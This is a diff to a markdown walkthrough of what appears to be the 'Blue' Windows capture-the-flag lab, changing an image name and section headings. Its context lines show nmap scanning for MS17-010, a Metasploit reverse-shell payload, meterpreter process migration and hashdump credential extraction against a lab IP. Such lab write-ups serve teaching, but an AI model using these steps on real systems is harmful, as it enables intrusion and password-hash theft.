@@ -6,7 +6,7 @@
 >
 > *Deploy & hack into a Windows machine, leveraging common misconfigurations issues.*
 >
-> ![](.gitbook/assets/ezgif-2-016707f505.jpg)
+> ![](.gitbook/assets/blue.jpg)
 
 ## Recon
 
@@ -16,7 +16,7 @@ nmap -sV -p445 10.10.177.175
 nmap --script smb-vuln-ms17-010 -p445 10.10.177.175
 ```
 
-## Gain Access
+## Exploitation
 
 ```bash
 msfconsole -q
@@ -36,7 +36,7 @@ background # or CTRL+Z
 
 ![](.gitbook/assets/image-20230316134157848.png)
 
-## Escalate
+## Privilege Escalation
 
 - Used payload was `windows/x64/shell/reverse_tcp`, so convert the shell to a `meterpreter` shell.
 
@@ -65,7 +65,9 @@ migrate 1284
 
 ![](.gitbook/assets/image-20230316141809336.png)
 
-## Cracking
+## Post Exploitation
+
+### Cracking
 
 ```bash
 hashdump
